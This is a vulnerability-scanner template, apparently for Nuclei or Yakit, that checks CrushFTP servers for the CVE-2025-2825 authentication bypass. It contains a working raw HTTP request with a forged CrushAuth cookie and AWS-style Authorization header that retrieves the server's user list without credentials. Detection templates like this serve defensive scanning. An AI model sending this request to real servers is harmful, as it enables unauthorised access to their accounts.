content:
id: CVE-2025-2825

info:
  name: Crushftp 认证绕过漏洞
  author: Deans
  severity: high
  description: CrushFTP是一款支持FTP, FTPS, SFTP, HTTP, HTTPS, WebDAV and WebDAV SSL等协议的跨平台FTP服务器软件。CrushFTP 被广泛用于企业、教育机构和个人用户之间安全地传输文件。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 36c9d1dc31602a6a8e0a1d7fb59ab6b5

http:
- raw:
  - |+
    @timeout: 30s
    GET /WebInterface/function/?command=getUserList&serverGroup=MainUsers&c2f=1111 HTTP/1.1
    Host: {{Hostname}}
    Cookie: CrushAuth=1743113839553_vD96EZ70ONL6xAd1DAJhXMZYMn1111
    Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - <user_list_subitem>crushadmin</user_list_subitem>
    condition: and

  - type: status
    status:
    - 200
    condition: and
